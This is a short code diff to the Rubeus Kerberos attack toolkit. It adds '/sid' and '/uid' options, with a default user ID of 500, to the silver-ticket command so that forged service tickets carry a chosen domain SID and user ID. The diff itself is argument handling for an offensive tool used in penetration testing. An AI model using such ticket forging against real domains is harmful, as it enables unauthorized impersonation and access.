@@ -18,6 +18,8 @@ namespace Rubeus.Commands
             string outfile = "";
             bool ptt = false;
             string service = "";
+            string sid = "";
+            int uid = 500;
 
             if (arguments.ContainsKey("/user"))
             {
@@ -48,6 +50,14 @@ namespace Rubeus.Commands
             {
                 Console.WriteLine("[X] SPN '/service:sname/server.domain.com' is required");
                 return;
+            }
+            if (arguments.ContainsKey("/sid"))
+            {
+                sid = arguments["/sid"];
+            }
+            if (arguments.ContainsKey("/uid"))
+            {
+                uid = Int32.Parse(arguments["/uid"]);
             }
 
             encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
@@ -126,7 +136,7 @@ namespace Rubeus.Commands
             }
             else
             {
-                ForgeTicket.Silver(user, service, hash, encType, domain, outfile, ptt);
+                ForgeTicket.Silver(user, service, hash, encType, sid, domain, uid, outfile, ptt);
                 return;
             }
         }
